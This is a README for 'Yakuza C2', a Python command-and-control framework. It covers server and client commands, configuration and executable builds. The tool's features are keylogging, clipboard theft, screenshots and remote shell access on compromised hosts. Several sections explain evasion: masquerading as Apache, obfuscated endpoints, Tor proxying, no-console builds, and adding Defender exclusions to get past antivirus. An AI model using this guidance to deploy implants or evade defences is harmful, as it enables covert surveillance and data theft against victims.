<div align="center">

> 📖 **[Read this README in Persian/Farsi (فارسی)](https://github.com/davoodya/C2-YakuzaDesign/README-FA.md)**

# 🥷 Yakuza C2 Framework

### *Advanced Command & Control Framework for Red Team Operations*

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-green.svg)]()
[![License](https://img.shields.io/badge/License-MIT-red.svg)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active-success.svg)]()

*"When power meets simplicity — Command with confidence"*

---

</div>

## 📑 Table of Contents

- [🎯 Overview](#-overview)
- [✨ Key Features](#-key-features)
- [🏗️ Architecture](#️-architecture)
- [🚀 Quick Start](#-quick-start)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
  - [Basic Usage](#basic-usage)
- [📖 Detailed Usage](#-detailed-usage)
  - [Server Commands](#server-commands)
  - [Client Commands](#client-commands)
  - [OS Commands](#os-commands)
- [⚙️ Configuration](#️-configuration)
  - [Network Settings](#network-settings)
  - [Encryption](#encryption)
  - [Environment Variables](#environment-variables)
- [🔐 Security Features](#-security-features)
- [🎨 Client Variants](#-client-variants)
- [📂 Project Structure](#-project-structure)
- [🛠️ Building Executables](#️-building-executables)
- [🔧 Advanced Configuration](#-advanced-configuration)
- [🐛 Troubleshooting](#-troubleshooting)
- [⚠️ Legal Disclaimer](#️-legal-disclaimer)
- [🤝 Contributing](#-contributing)
- [📜 License](#-license)
- [👤 Author](#-author)

---

## 🎯 Overview

**Yakuza C2** is a sophisticated, HTTP-based Command & Control (C2) framework designed for red team operations, penetration testing, and security research. Built entirely in Python, it provides a robust infrastructure for managing compromised systems with military-grade encryption, multi-session handling, and cross-platform compatibility.

### 💡 Why Yakuza C2?

- **🔒 Military-Grade Encryption**: AES-256 encryption for all communications
- **🌐 HTTP-Based**: Blends seamlessly with legitimate web traffic
- **🖥️ Cross-Platform**: Native support for Windows and Linux
- **⚡ Multi-Session**: Control multiple clients simultaneously
- **🎭 Stealth Operations**: Masquerades as Apache web server
- **🧩 Modular Design**: Easy to extend and customize
- **📦 Zero Dependencies**: Builds to standalone executables

---

## ✨ Key Features

### 🎮 Command & Control

- **Multi-Client Session Management**: Control unlimited compromised systems simultaneously
- **Session Switching**: Seamlessly switch between active client sessions
- **Real-time Command Execution**: Execute OS commands with immediate feedback
- **Background Job Execution**: Run long-running tasks without blocking
- **Keep-Alive Mechanism**: Automatic session maintenance for cloud hosting

### 🔐 Security & Encryption

- **Fernet Symmetric Encryption**: All HTTP traffic encrypted with AES-256
- **Encrypted File Transfers**: Secure bidirectional file transfer
- **ZIP Encryption**: AES-encrypted archives with LZMA compression
- **Stealth Mode**: Server disguised as Apache/CentOS infrastructure
- **Obfuscated Endpoints**: Non-obvious HTTP paths for communication

### 📁 File Operations

- **Upload/Download**: Bidirectional encrypted file transfer
- **ZIP/Unzip**: Compress and encrypt files on-the-fly
- **Directory Traversal**: Navigate client filesystem
- **File Listing**: Browse directories on server and clients
- **Automatic Encryption**: All files encrypted during transfer

### 🕵️ Advanced Capabilities

#### Windows Clients:
- **Keylogging**: Capture keyboard input
- **Screenshot Capture**: Grab multi-monitor screenshots
- **Clipboard Stealing**: Extract clipboard data
- **Keyboard Control**: Type text remotely
- **Display Image**: Show images on victim's screen
- **Audio Playback**: Play WAV files remotely
- **Screen Rotation/Flip**: Prank or disorient targets
- **Volume Control**: Maximize system volume

#### Linux Clients:
- **GUI Client**: Full feature support with GUI dependencies
- **Headless Client**: Lightweight for server environments
- **Keylogging**: Capture keyboard input (GUI only)
- **Screenshot**: Multi-monitor support (GUI only)
- **Clipboard Access**: Extract clipboard data
- **Remote Typing**: Keyboard simulation

### 🌐 Network Features

- **Proxy Support**: Built-in Tor/SOCKS proxy configuration
- **Custom Headers**: Configurable HTTP headers for evasion
- **Flexible Binding**: Bind to specific interfaces or all
- **Configurable Ports**: Any port configuration
- **Session Timeout**: Automatic reconnection handling

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    C2 Server (Python)                   │
│  ┌─────────────────────────────────────────────────┐   │
│  │   ThreadingHTTPServer (Multi-threaded)          │   │
│  │   - Handles GET/POST/PUT requests               │   │
│  │   - Session management (pwnedDict)              │   │
│  │   - Encryption/Decryption layer                 │   │
│  │   - File transfer handler                       │   │
│  └─────────────────────────────────────────────────┘   │
│                                                         │
│  📂 incoming/  (Client uploads)                        │
│  📂 outgoing/  (Files for client download)             │
│  📄 pwned.log  (Connection logs)                       │
└─────────────────────────────────────────────────────────┘
                          ▲
                          │ HTTP/HTTPS (Encrypted)
                          │
        ┌─────────────────┼─────────────────┐
        │                 │                 │
        ▼                 ▼                 ▼
┌──────────────┐  ┌──────────────┐  ┌──────────────┐
│   Client 1   │  │   Client 2   │  │   Client N   │
│  (Windows)   │  │   (Linux)    │  │    (Any)     │
│              │  │              │  │              │
│ • Encrypted  │  │ • Encrypted  │  │ • Encrypted  │
│ • HTTP Req   │  │ • HTTP Req   │  │ • HTTP Req   │
│ • Auto Recon │  │ • Auto Recon │  │ • Auto Recon │
└──────────────┘  └──────────────┘  └──────────────┘
```

### Communication Flow

1. **Client Initialization**: Client encrypts `username@hostname@timestamp` and sends GET request
2. **Server Authentication**: Server decrypts, validates, assigns session ID
3. **Command Polling**: Client polls server every N seconds for commands
4. **Encrypted Response**: Server sends encrypted commands via HTTP 200
5. **Result Transmission**: Client executes and POSTs encrypted results
6. **Session Management**: Server tracks active sessions in `pwnedDict`

### Encryption Layer

```python
Fernet (AES-256 CBC)
└── Base64 URL-Safe Encoding
    └── 32-byte Key (Auto-padded)
        └── All HTTP traffic encrypted
```

---

## 🚀 Quick Start

### Prerequisites

- **Python 3.8+** (Python 3.9+ recommended)
- **pip** (Python package manager)
- **Operating System**: Windows 10+, Linux (Ubuntu 20.04+, Debian, Arch, etc.)

### Installation

#### 1. Clone the Repository

```bash
git clone https://github.com/davoodya/C2-YakuzaDesign.git
cd C2-YakuzaDesign
```

#### 2. Install Dependencies

```bash
pip install -r requirments.txt
```

**Dependencies include:**
- `requests` - HTTP client library
- `cryptography` - Encryption (Fernet/AES)
- `colorama` - Terminal colors
- `pyzipper` - AES-encrypted ZIP archives
- `pynput` - Keyboard/mouse control
- `pillow` - Screenshot/image handling
- `pyperclip` - Clipboard access
- `inputimeout` - Timeout input handling
- `rotate-screen` - Screen rotation (Windows)

#### 3. Configure Settings

Edit `settings.py` to configure your C2 infrastructure:

```python
# Server Settings
PORT = 12921                # C2 server port
BIND_ADDR = ""              # Empty = bind to all interfaces
C2_SERVER = "192.168.1.100" # Server IP for clients

# Encryption
KEY = "YourSecretKey123"    # Encryption key (32 chars max)
ZIP_PASSWORD = b"YourZipPassword"

# Delays
DELAY = 3                   # Client reconnection delay (seconds)
INPUT_TIMEOUT = None        # Command timeout (None = disabled)
```

### Basic Usage

#### Start the C2 Server

**Windows:**
```bash
python c2_server.py
```

**Linux:**
```bash
python3 c2_server_linux.py
# or
chmod +x c2_server_linux.py
./c2_server_linux.py
```

#### Deploy a Client

**Windows Client:**
```bash
python win_client.py
```

**Linux GUI Client:**
```bash
python3 linux_client_gui.py
```

**Linux Headless Client:**
```bash
python3 linux_client_headless.py
```

#### Initial Connection

Once a client connects, you'll see:

```
[+] username@hostname(192.168.1.50) has been Pwned
```

You can now execute commands on the compromised system.

---

## 📖 Detailed Usage

### Server Commands

Server commands manage the C2 infrastructure itself:

| Command | Description | Example |
|---------|-------------|---------|
| `server show clients` | List all connected clients and active session | `server show clients` |
| `server control PWNED_ID` | Switch to a different client session | `server control 2` |
| `server zip FILENAME` | Encrypt file in outgoing/ folder | `server zip payload.exe` |
| `server unzip FILENAME` | Decrypt file in incoming/ folder | `server unzip data.zip` |
| `server list [DIRECTORY]` | List files on the C2 server | `server list incoming` |
| `server shell` | Open a shell on the C2 server | `server shell` |
| `server exit` | Gracefully shutdown the C2 server | `server exit` |
| `server help` | Show all available commands | `server help` |

### Client Commands

Client commands execute on the compromised system:

#### 📁 File Operations

| Command | Description | Example |
|---------|-------------|---------|
| `client download FILE` | Transfer file from server to client | `client download outgoing/payload.exe` |
| `client upload FILE` | Transfer file from client to server | `client upload C:\passwords.txt` |
| `client zip FILE` | Encrypt file on client | `client zip document.pdf` |
| `client unzip FILE` | Decrypt file on client | `client unzip data.zip` |

#### 🕵️ Intelligence Gathering

| Command | Description | Example |
|---------|-------------|---------|
| `client get clipboard` | Steal clipboard contents | `client get clipboard` |
| `client screenshot` | Capture all monitors | `client screenshot` |
| `client keylog on` | Start keylogger | `client keylog on` |
| `client keylog off` | Stop keylogger and save | `client keylog off` |

#### 🎮 Interaction & Control

| Command | Description | Example |
|---------|-------------|---------|
| `client type TEXT` | Type text on client keyboard | `client type Hello World` |
| `client display IMAGE` | Show image on client screen | `client display funny.jpg` |
| `client max volume` | Set volume to maximum | `client max volume` |

#### 🎭 Windows-Specific

| Command | Description | Example |
|---------|-------------|---------|
| `client play FILE.wav` | Play audio file | `client play alarm.wav` |
| `client flip screen` | Flip screen upside down | `client flip screen` |
| `client rotate screen` | Rotate screen 360° | `client rotate screen` |

#### ⚙️ Session Management

| Command | Description | Example |
|---------|-------------|---------|
| `client delay SECONDS` | Change reconnection delay | `client delay 10` |
| `client kill` | Terminate client permanently | `client kill` |

### OS Commands

Any command not starting with `server` or `client` is executed as an OS command:

```bash
# Windows examples
(192.168.1.50)user@DESKTOP-ABC:C:\Users\user$ whoami
(192.168.1.50)user@DESKTOP-ABC:C:\Users\user$ ipconfig
(192.168.1.50)user@DESKTOP-ABC:C:\Users\user$ dir

# Linux examples
(192.168.1.50)user@ubuntu:~$ whoami
(192.168.1.50)user@ubuntu:~$ ifconfig
(192.168.1.50)user@ubuntu:~$ ls -la

# Background execution (non-blocking)
(192.168.1.50)user@ubuntu:~$ nmap 192.168.1.0/24 &
```

**Background Jobs**: Add ` &` to run commands in background. Output saved to `Job_N.txt` on client.

---

## ⚙️ Configuration

### Network Settings

#### `settings.py`

```python
# Server Configuration
PORT = 12921                    # Port for C2 server
BIND_ADDR = ""                  # "" = all interfaces, or specific IP
C2_SERVER = "192.168.1.100"     # Server IP/hostname for clients

# Client Networking
DELAY = 3                       # Reconnection delay in seconds
PROXY = None                    # Or: {"http": "http://127.0.0.1:8080", "https": "..."}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
```

#### Using Tor Proxy

```python
# Enable Tor routing
PROXY = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}
```

### Encryption

```python
# Encryption Settings
KEY = "MySecretKey"             # Max 32 chars (auto-padded)
ZIP_PASSWORD = b"ArchivePass"   # Must be bytes

# HTTP Endpoints (obfuscation)
CMD_REQUEST = "/book?isbn="     # Command request path
FILE_REQUEST = "/author?name="  # File download path
FILE_SEND = "/reviews"          # File upload path
RESPONSE = "/inventory"         # Command response path
CWD_RESPONSE = "/title"         # Directory info path
```

### Environment Variables

The framework doesn't require environment variables, but you can use them:

```bash
# Linux/Mac
export C2_SERVER="10.0.0.5"
export C2_PORT="8080"

# Windows
set C2_SERVER=10.0.0.5
set C2_PORT=8080
```

---

## 🔐 Security Features

### 1. **End-to-End Encryption**

All communications use Fernet (AES-256 CBC):
- Client identification encrypted
- Commands encrypted
- Results encrypted
- Files encrypted during transfer

### 2. **Stealth & Obfuscation**

```python
# Server masquerades as Apache
server_version = "Apache/4.6.2"
sys_version = "(CentOS)"

# Non-obvious HTTP paths
CMD_REQUEST = "/book?isbn="
FILE_REQUEST = "/author?name="
```

### 3. **File Encryption**

```python
# AES-256 encrypted ZIP archives
ZIP_PASSWORD = b"*--->Red_Team_Winning<---*"
compression = ZIP_LZMA
encryption = WZ_AES
```

### 4. **Session Isolation**

Each client gets unique session ID based on `username@hostname@timestamp`

### 5. **Access Control**

- Only registered sessions receive commands (404 for others)
- Unknown HTTP paths trigger security alerts
- Connection logging to `pwned.log`

---

## 🎨 Client Variants

### Windows Client (`win_client.py`)

**Full-Featured Windows Client**

- All features supported
- Screen rotation/flip
- Audio playback
- Compiled with PyInstaller

**Features:**
✅ Keylogging
✅ Screenshots
✅ Clipboard
✅ Screen manipulation
✅ Audio playback
✅ File operations

### Linux GUI Client (`linux_client_gui.py`)

**For Desktop Linux Environments**

- Requires X11/Wayland
- Full keyboard/mouse control
- Screenshot support

**Features:**
✅ Keylogging
✅ Screenshots
✅ Clipboard
✅ Keyboard control
✅ File operations

### Linux Headless Client (`linux_client_headless.py`)

**For Servers Without GUI**

- Minimal dependencies
- No GUI libraries
- Perfect for servers/containers

**Features:**
✅ Clipboard (if available)
✅ File operations
✅ OS command execution
❌ Screenshots
❌ Keylogging
❌ Keyboard control

---

## 📂 Project Structure

```
C2_py/
├── 📄 c2_server.py                    # Windows C2 server
├── 📄 c2_server_linux.py              # Linux C2 server
├── 📄 win_client.py                   # Windows client
├── 📄 linux_client_gui.py             # Linux GUI client
├── 📄 linux_client_headless.py        # Linux headless client
├── 📄 encryption.py                   # Fernet encryption module
├── 📄 settings.py                     # Configuration file
├── 📄 requirments.txt                 # Python dependencies
├── 📄 win_client.spec                 # PyInstaller spec file
├── 📄 LICENSE                         # MIT License
├── 📄 README.md                       # This file
│
├── 📁 incoming/                       # Client uploads
│   ├── clipboard_1.txt
│   ├── Keys.log
│   └── screenshot_1.png
│
├── 📁 outgoing/                       # Files for client download
│
├── 📁 BuildVersions/                  # Pre-built executables
│   └── Version 1.0.0/
│       ├── Windows/
│       │   ├── win_client(localhost-noprint-simple).exe
│       │   ├── win_client(localhost-noprint-upx).exe
│       │   └── win_client(localhost-print-upx).exe
│       └── Linux/
│           ├── c2_server_linux(localhost)
│           ├── c2_server_linux - (upx-localhost)
│           ├── linux_client_gui(localhost)
│           ├── linux_client_gui - (upx-localhost)
│           ├── linux_client_headless(localhost)
│           └── linux_client_headless - (upx-localhost)
│
├── 📁 miscs/                          # Utility scripts
│   ├── cp_files.sh
│   ├── start6.sh
│   ├── sync.bat
│   └── sync_files.py
│
└── 📄 pwned.log                       # Connection log
```

---

## 🛠️ Building Executables

### Windows Executable (PyInstaller)

```bash
# Install PyInstaller
pip install pyinstaller

# Build with console (debugging)
pyinstaller --onefile --name win_client win_client.py

# Build without console (stealth)
pyinstaller --onefile --noconsole --name win_client win_client.py

# Build with custom icon
pyinstaller --onefile --noconsole --icon=icon.ico --name win_client win_client.py

# Build with UPX compression (smaller size)
pyinstaller --onefile --noconsole --upx-dir=/path/to/upx --name win_client win_client.py
```

**Using Provided Spec File:**

```bash
pyinstaller win_client.spec
```

### Linux Executable (PyInstaller)

```bash
# Install PyInstaller
pip3 install pyinstaller

# Build server
pyinstaller --onefile c2_server_linux.py

# Build GUI client
pyinstaller --onefile linux_client_gui.py

# Build headless client
pyinstaller --onefile linux_client_headless.py

# With UPX compression
pyinstaller --onefile --upx-dir=/usr/bin/upx linux_client_headless.py
```

### Cross-Platform Build (Docker)

```bash
# Windows from Linux
docker run -v "$(pwd):/src" cdrx/pyinstaller-windows "pyinstaller --onefile win_client.py"

# Linux from Windows
docker run -v "%cd%:/src" cdrx/pyinstaller-linux "pyinstaller --onefile linux_client_headless.py"
```

---

## 🔧 Advanced Configuration

### Custom HTTP Paths

Change endpoints in `settings.py` for additional obfuscation:

```python
CMD_REQUEST = "/api/v2/auth?token="
FILE_REQUEST = "/cdn/assets?file="
FILE_SEND = "/api/upload"
RESPONSE = "/api/status"
CWD_RESPONSE = "/api/info"
```

### Cloud Hosting (Azure/AWS)

Cloud providers kill idle HTTP connections. Enable INPUT_TIMEOUT:

```python
# settings.py
INPUT_TIMEOUT = 225  # Seconds before auto-command
KEEP_ALIVE_CMD = "whoami"  # Command to keep session alive
```

### Custom Shells

```python
# settings.py
SHELL_WINDOWS = "powershell.exe"  # Use PowerShell instead of CMD
SHELL_LINUX = "/bin/zsh"          # Use Zsh instead of Bash
```

### Multi-Interface Binding

```python
# Bind to specific interface
BIND_ADDR = "192.168.1.100"

# Bind to all interfaces (default)
BIND_ADDR = ""

# Localhost only (testing)
BIND_ADDR = "127.0.0.1"
```

---

## 🐛 Troubleshooting

### Client Won't Connect

**Problem**: Client can't reach server

**Solutions**:
1. Check firewall rules:
   ```bash
   # Windows
   netsh advfirewall firewall add rule name="C2 Server" dir=in action=allow protocol=TCP localport=12921
   
   # Linux
   sudo ufw allow 12921/tcp
   ```

2. Verify `C2_SERVER` IP in `settings.py`
3. Check server is running: `netstat -an | grep 12921`
4. Try `BIND_ADDR = ""` to bind all interfaces

### Encryption Errors

**Problem**: `InvalidToken` or decryption failures

**Solutions**:
1. Ensure KEY is identical on server and clients
2. Key must be ≤32 characters
3. Rebuild clients after changing KEY
4. Check for encoding issues (UTF-8)

### Import Errors

**Problem**: `ModuleNotFoundError`

**Solutions**:
```bash
# Reinstall all dependencies
pip install -r requirments.txt --force-reinstall

# Or install missing module
pip install <module-name>
```

### Windows Client Detection

**Problem**: Antivirus flags executable

**Solutions**:
1. Add exception in Windows Defender:
   ```powershell
   Add-MpPreference -ExclusionPath "C:\path\to\win_client.exe"
   ```
2. Use obfuscation tools (PyArmor)
3. Sign executable with valid certificate
4. Build with different PyInstaller options

### Linux Permission Issues

**Problem**: `Permission denied` errors

**Solutions**:
```bash
# Make script executable
chmod +x linux_client_gui.py

# Run with sudo if needed
sudo python3 linux_client_gui.py
```

### Screenshot Fails (Linux)

**Problem**: Screenshot command fails

**Solutions**:
```bash
# Install required packages
sudo apt install python3-tk python3-dev scrot

# For Wayland
sudo apt install grim slurp
```

### Keylogger Not Working

**Problem**: Keylogger doesn't capture keys

**Solutions**:
```bash
# Linux: Run with root privileges
sudo python3 linux_client_gui.py

# Windows: Run as Administrator
# Right-click → Run as Administrator
```

---

## ⚠️ Legal Disclaimer

```
╔═══════════════════════════════════════════════════════════════╗
║                      ⚠️  LEGAL WARNING ⚠️                     ║
║                                                               ║
║  This tool is for AUTHORIZED SECURITY RESEARCH ONLY.         ║
║                                                               ║
║  UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS IS ILLEGAL.         ║
║                                                               ║
║  By using this software, you agree to:                       ║
║  • Only use on systems you own or have written permission    ║
║  • Comply with all applicable laws and regulations           ║
║  • Accept full responsibility for your actions               ║
║                                                               ║
║  The author assumes NO LIABILITY for misuse or damage.       ║
║                                                               ║
║  Violators will be prosecuted under:                         ║
║  • Computer Fraud and Abuse Act (CFAA) - USA                 ║
║  • Computer Misuse Act - UK                                  ║
║  • Cybercrime laws in your jurisdiction                      ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
```

### Authorized Use Cases:

✅ **Penetration Testing** (with written authorization)
✅ **Red Team Exercises** (authorized by organization)
✅ **Security Research** (on own infrastructure)
✅ **Educational Purposes** (in isolated lab environments)
✅ **Incident Response** (with proper authorization)

### Prohibited Use:

❌ Unauthorized access to systems
❌ Malicious attacks or harm
❌ Data theft or espionage
❌ Deployment without permission
❌ Any illegal activity

**Use responsibly. Get authorization in writing.**

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

### How to Contribute

1. **Fork the Repository**
   ```bash
   git clone https://github.com/yourusername/C2_py.git
   cd C2_py
   git checkout -b feature/your-feature-name
   ```

2. **Make Your Changes**
   - Add new features
   - Fix bugs
   - Improve documentation
   - Enhance security

3. **Test Thoroughly**
   ```bash
   # Test on Windows and Linux
   python c2_server.py
   python win_client.py
   ```

4. **Submit Pull Request**
   - Clear description of changes
   - Reference any related issues
   - Include test results

### Contribution Ideas

- 🔐 Additional encryption options
- 🌐 HTTPS/SSL support
- 📱 Android client
- 🍎 macOS client
- 🔌 Plugin system
- 📊 Web-based dashboard
- 🔍 Enhanced stealth features
- 📝 Additional logging options

### Code Style

- Follow PEP 8 guidelines
- Add docstrings to functions
- Comment complex logic
- Use meaningful variable names

---

## 📜 License

This project is licensed under the **MIT License**.

```
MIT License

Copyright (c) 2024 Davood Yahay (D.Yakuza)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

See [LICENSE](LICENSE) for full details.

---

## 👤 Author

**Davood Yahay (D.Yakuza)**

*Cybersecurity Researcher & Red Team Operator*

- 🌐 Website: [davoodya.ir](https://davoodya.ir)
- 📧 Email: [davoodyahay@gmail.com](mailto:davoodyahay@gmail.com)
- 🐱 GitHub: [@davoodya](https://github.com/davoodya)
- 🐦 Twitter/X: [@davood_yahay](https://twitter.com/davood_yahay)
- 💼 LinkedIn: [davoody](https://linkedin.com/in/davoody)
- 📸 Instagram: [@davoodsec](https://instagram.com/davoodsec)
- ✈️ Telegram: [@davoodsec](https://t.me/davoodsec)

### Project Info

- **Version**: 1.0.0
- **Last Updated**: October 10, 2024 (16 Mehr 1403)
- **Status**: Active Development
- **Language**: Python 3.8+

---

<div align="center">

### ⭐ Star this repository if you find it useful!

**Made with ❤️ by Davood Yahay Professionals**

*For security research and authorized testing only*

---

### 🔗 Related Projects

[Metasploit Framework](https://github.com/rapid7/metasploit-framework) • 
[Cobalt Strike](https://www.cobaltstrike.com/) • 
[Empire](https://github.com/EmpireProject/Empire) • 
[Sliver](https://github.com/BishopFox/sliver)

---

**🥷 Stay Stealthy. Command Wisely. 🥷**

</div>
